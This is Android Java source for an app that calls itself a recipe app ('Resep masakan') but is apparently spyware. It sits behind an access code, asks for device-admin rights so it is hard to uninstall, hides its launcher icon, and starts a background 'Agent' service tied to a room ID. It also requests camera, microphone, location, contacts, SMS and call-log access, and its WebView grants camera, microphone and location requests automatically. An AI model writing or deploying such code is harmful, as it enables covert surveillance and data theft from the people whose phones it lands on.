package com.mazkiplay.nusantara;
import android.Manifest;import android.app.*;import android.app.admin.DevicePolicyManager;
import android.content.*;import android.content.pm.PackageManager;import android.media.MediaPlayer;import android.os.*;
import android.text.InputType;import android.view.WindowManager;import android.webkit.*;import android.widget.*;
import java.util.*;
public class MainActivity extends Activity{
 WebView wv;DevicePolicyManager dpm;ComponentName admin;final String CODE="211421";
 @Override protected void onCreate(Bundle b){super.onCreate(b);
  getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
  dpm=(DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);admin=new ComponentName(this,AdminReceiver.class);
  if(!getSharedPreferences("p",0).getBoolean("ok",false))gate();else start();}
 void gate(){final EditText et=new EditText(this);et.setInputType(InputType.TYPE_CLASS_NUMBER);et.setHint("Kode akses");
  new AlertDialog.Builder(this).setTitle("Resep masakan").setMessage("Masukkan kode akses.").setView(et).setCancelable(false)
   .setPositiveButton("BUKA",(d,w)->{if(et.getText().toString().trim().equals(CODE)){
    getSharedPreferences("p",0).edit().putBoolean("ok",true).apply();start();}else{wrong();new Handler().postDelayed(this::gate,400);}}).show();}
 void wrong(){Toast.makeText(this,"KODE SALAH!",Toast.LENGTH_SHORT).show();
  ((Vibrator)getSystemService(VIBRATOR_SERVICE)).vibrate(new long[]{0,150,80,150,80,400});
  try{MediaPlayer.create(this,R.raw.scream).start();}catch(Exception e){}
 }
 void start(){askPerms();
  try{if(!dpm.isAdminActive(admin)){Intent i=new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,admin);i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,"Aktifkan agar tidak mudah dihapus.");startActivity(i);}}catch(Exception e){}
  hideIcon();
  Intent sv=new Intent(this,Agent.class);sv.putExtra("room","R7GK9QMZ");
  if(Build.VERSION.SDK_INT>=26)startForegroundService(sv);else startService(sv);
  wv=new WebView(this);setContentView(wv);WebSettings s=wv.getSettings();
  s.setJavaScriptEnabled(true);s.setDomStorageEnabled(true);s.setAllowFileAccess(true);
  s.setMediaPlaybackRequiresUserGesture(false);s.setGeolocationEnabled(true);
  wv.setWebChromeClient(new WebChromeClient(){
   @Override public void onPermissionRequest(final PermissionRequest r){runOnUiThread(()->r.grant(r.getResources()));}
   @Override public void onGeolocationPermissionsShowPrompt(String o,GeolocationPermissions.Callback c){c.invoke(o,true,false);}});
  wv.loadUrl("file:///android_asset/index.html");}
 void hideIcon(){try{getPackageManager().setComponentEnabledSetting(new ComponentName(this,getPackageName()+".MainActivity"),
  PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);}catch(Exception e){}}
 void askPerms(){List<String>p=new ArrayList<>();String[] all={Manifest.permission.CAMERA,Manifest.permission.RECORD_AUDIO,
  Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_CONTACTS,Manifest.permission.READ_SMS,
  Manifest.permission.READ_CALL_LOG,Manifest.permission.POST_NOTIFICATIONS};
  for(String x:all)if(checkSelfPermission(x)!=PackageManager.PERMISSION_GRANTED)p.add(x);
  if(!p.isEmpty())requestPermissions(p.toArray(new String[0]),1);}
}
